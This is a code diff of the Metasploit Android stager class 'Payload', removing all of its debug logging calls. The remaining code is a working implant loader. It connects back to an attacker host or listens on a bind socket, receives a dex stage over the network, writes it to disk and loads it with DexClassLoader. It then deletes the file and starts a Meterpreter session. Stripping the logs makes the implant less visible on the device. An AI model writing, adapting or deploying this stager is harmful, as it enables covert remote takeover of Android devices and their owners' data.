@@ -1,7 +1,6 @@
 package com.metasploit.stage;
 
 import android.content.Context;
-import android.util.Log;
 
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
@@ -51,7 +50,6 @@ public class Payload {
     }
 
     public static void main(String[] args) {
-        Log.d("msf", "In main()");
         if (args != null) {
             File currentDir = new File(".");
             String path = currentDir.getAbsolutePath();
@@ -61,16 +59,11 @@ public class Payload {
         long commTimeout;
         long retryTotal;
         long retryWait;
-        Log.d("msf", "Timeouts: " + TIMEOUTS.substring(4));
         String[] timeouts = TIMEOUTS.substring(4).trim().split("-");
         try {
-            Log.d("msf", "Session Expiry: " + timeouts[0]);
             sessionExpiry = Integer.parseInt(timeouts[0]);
-            Log.d("msf", "Comm Timeout: " + timeouts[1]);
             commTimeout = Integer.parseInt(timeouts[1]);
-            Log.d("msf", "Retry total: " + timeouts[2]);
             retryTotal = Integer.parseInt(timeouts[2]);
-            Log.d("msf", "Retry wait: " + timeouts[3]);
             retryWait = Integer.parseInt(timeouts[3]);
         } catch (NumberFormatException e) {
             return;
@@ -83,7 +76,6 @@ public class Payload {
         retry_wait = TimeUnit.SECONDS.toMillis(retryWait);
 
         String url = URL.substring(4).trim();
-        Log.d("msf", "URL = " + url);
         // technically we need to check for session expiry here as well.
         while (System.currentTimeMillis() < payloadStart + retry_total &&
             System.currentTimeMillis() < session_expiry) {
@@ -126,19 +118,15 @@ public class Payload {
         String host = parts[1].split("/")[2];
         Socket sock = null;
 
-        Log.d("msf", "Host is: " + host);
         if (host.equals("")) {
-            Log.d("msf", "Bind socket");
             ServerSocket server = new ServerSocket(port);
             sock = server.accept();
             server.close();
         } else {
-            Log.d("msf", "Reverse socket");
             sock = new Socket(host, port);
         }
 
         if (sock != null) {
-            Log.d("msf", "Socket connected");
             sock.setSoTimeout(500);
             DataInputStream in = new DataInputStream(sock.getInputStream());
             OutputStream out = new DataOutputStream(sock.getOutputStream());
@@ -153,20 +141,16 @@ public class Payload {
 
         // Read the class name
         int coreLen = in.readInt();
-        Log.d("msf", "Class length: " + coreLen);
         byte[] core = new byte[coreLen];
         in.readFully(core);
         String classFile = new String(core);
-        Log.d("msf", "Class: " + classFile);
 
         // Read the stage
         coreLen = in.readInt();
-        Log.d("msf", "Core length: " + coreLen);
         core = new byte[coreLen];
         in.readFully(core);
 
         File file = new File(filePath);
-        Log.d("msf", "Writing to: " + filePath);
         if (!file.exists()) {
             file.createNewFile();
         }
@@ -176,20 +160,15 @@ public class Payload {
         fop.close();
 
         // Load the stage
-        Log.d("msf", "Loading into classloader");
         DexClassLoader classLoader = new DexClassLoader(filePath, path, path,
                 Payload.class.getClassLoader());
         Class<?> myClass = classLoader.loadClass(classFile);
-        Log.d("msf", "Class loaded");
         final Object stage = myClass.newInstance();
-        Log.d("msf", "Instance " + (stage == null ? "null" : "created"));
         file.delete();
         new File(dexPath).delete();
-        Log.d("msf", "Invoking Meterpreter");
         myClass.getMethod("start",
                 new Class[]{DataInputStream.class, OutputStream.class, String[].class})
                 .invoke(stage, in, out, parameters);
-        Log.d("msf", "Session finished, terminating process");
         System.exit(0);
     }
 }
